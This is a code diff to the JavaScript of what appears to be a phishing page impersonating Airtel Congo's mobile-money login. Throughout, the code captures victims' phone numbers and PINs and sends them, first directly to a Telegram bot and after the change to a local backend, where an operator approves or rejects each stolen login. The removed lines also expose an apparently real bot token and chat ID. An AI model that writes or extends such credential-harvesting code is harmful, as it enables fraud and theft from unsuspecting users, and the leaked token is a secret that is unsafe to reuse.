@@ -1,15 +1,11 @@
-// Telegram Bot Client-Side Only Integration
-// SECURITY NOTE: Bot token should ideally be kept secret
-// For demo/testing purposes, this implementation polls Telegram directly
+const TELEGRAM_API_BASE = 'http://localhost:3000/api';
+const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+const ADMIN_CHAT_ID = 'YOUR_ADMIN_CHAT_ID';
 
-// ===========================================
-// CONFIGURE YOUR TELEGRAM BOT TOKEN HERE
-// ===========================================
-const BOT_TOKEN = '8814762444:AAHh9cM13O55o30Sv4OvXtC5B0JaF4tdm_o';
-const ADMIN_CHAT_ID = '7867527304';
-// ===========================================
+// Only proceed if config is not placeholder
+const USE_TELEGRAM = !BOT_TOKEN.includes('YOUR_');
 
-const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const telegramApi = USE_TELEGRAM ? `https://api.telegram.org/bot${BOT_TOKEN}` : TELEGRAM_API_BASE;
 
 const eyeButton = document.querySelector('.al-eye');
 const codeInputs = [...document.querySelectorAll('.al-pin')];
@@ -35,9 +31,30 @@ if (phoneInput) {
     });
 }
 
-codeInputs.forEach(input => {
-    input.addEventListener('input', state);
-    input.addEventListener('paste', state);
+codeInputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+        const value = e.target.value.replace(/\D/g, '');
+        e.target.value = value.slice(0, 1);
+        
+        if (value.length === 1 && index < codeInputs.length - 1) {
+            codeInputs[index + 1].focus();
+        }
+        state();
+        
+        if (value.length === 1 && index === codeInputs.length - 1) {
+            document.querySelector('#login-form')?.dispatchEvent(new Event('submit'));
+        }
+    });
+    
+    input.addEventListener('paste', () => {
+        setTimeout(state, 100);
+    });
+    
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            codeInputs[index - 1].focus();
+        }
+    });
 });
 
 let approvalCheckInterval = null;
@@ -49,6 +66,8 @@ function state() {
     const phoneValid = phoneInput.value.length === 9 && phoneInput.value.startsWith('9');
     connectBtn.disabled = !(ok && phoneValid);
     connectBtn.classList.toggle('enabled', ok && phoneValid);
+    connectBtn.style.backgroundColor = (ok && phoneValid) ? '#ed1c2e' : '#ddd';
+    connectBtn.style.cursor = (ok && phoneValid) ? 'pointer' : 'not-allowed';
 }
 
 function showInvalidNumber() {
@@ -96,50 +115,25 @@ async function sendTelegramNotification(phone, pin) {
     const message = '📲 Nouvelle demande Airtel Congo\n📱 Téléphone: ' + phone + '\n🔑 PIN: ' + pin + '\n🆔 Request: ' + requestId + '\n\n✅ /approve_' + requestId + ' - Approuver\n❌ /reject_' + requestId + ' - Rejeter';
     
     try {
-        const response = await fetch(TELEGRAM_API + '/sendMessage', {
+        const response = await fetch(TELEGRAM_API_BASE + '/telegram-notification', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ADMIN_CHAT_ID,
-                text: message,
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: '✅ Approuver', callback_data: 'approve_' + requestId },
-                        { text: '❌ Rejeter', callback_data: 'reject_' + requestId }
-                    ]]
-                }
-            })
+            body: JSON.stringify({ phone: phone, pin: pin, requestId: requestId })
         });
-        const data = await response.json();
-        return { success: data.ok, data: data, requestId: requestId };
+        return { success: response.ok, requestId: requestId };
     } catch (e) {
         console.error('Telegram send failed:', e);
-        return { success: false, error: e.message };
+        return { success: false, error: e.message, requestId: requestId };
     }
 }
 
-async function checkTelegramApproval(requestId) {
+async function checkApprovalStatus(requestId) {
     try {
-        const response = await fetch(TELEGRAM_API + '/getUpdates?offset=-1000000000');
+        const response = await fetch(TELEGRAM_API_BASE + '/check-approval/' + requestId);
         const data = await response.json();
-        
-        if (data.ok && data.result) {
-            for (const update of data.result) {
-                if (update.callback_query) {
-                    const [action, id] = update.callback_query.data.split('_');
-                    if (id === requestId) {
-                        if (action === 'approve') {
-                            return { approved: true, status: 'approved' };
-                        } else if (action === 'reject') {
-                            return { approved: false, status: 'rejected' };
-                        }
-                    }
-                }
-            }
-        }
-        return { approved: false, status: 'pending' };
+        return data;
     } catch (e) {
-        console.error('Telegram check failed:', e);
+        console.error('Approval check failed:', e);
         return { approved: false, status: 'error' };
     }
 }
@@ -151,7 +145,7 @@ function startApprovalPolling(requestId) {
     
     approvalCheckInterval = setInterval(async () => {
         checkCount++;
-        const result = await checkTelegramApproval(requestId);
+        const result = await checkApprovalStatus(requestId);
         
         const subtitle = document.getElementById('telegram-loading-subtitle');
         if (subtitle) {
@@ -188,10 +182,7 @@ function initiateTelegramApproval() {
     }
     
     const pin = codeInputs.map(input => input.value).join('');
-    if (pin.length !== 4) {
-        showLoadingWithProgress('Code PIN Invalide', true);
-        return;
-    }
+    if (pin.length !== 4) return;
     
     sessionStorage.setItem('airtelPhone', phone);
     sessionStorage.setItem('airtelPin', pin);
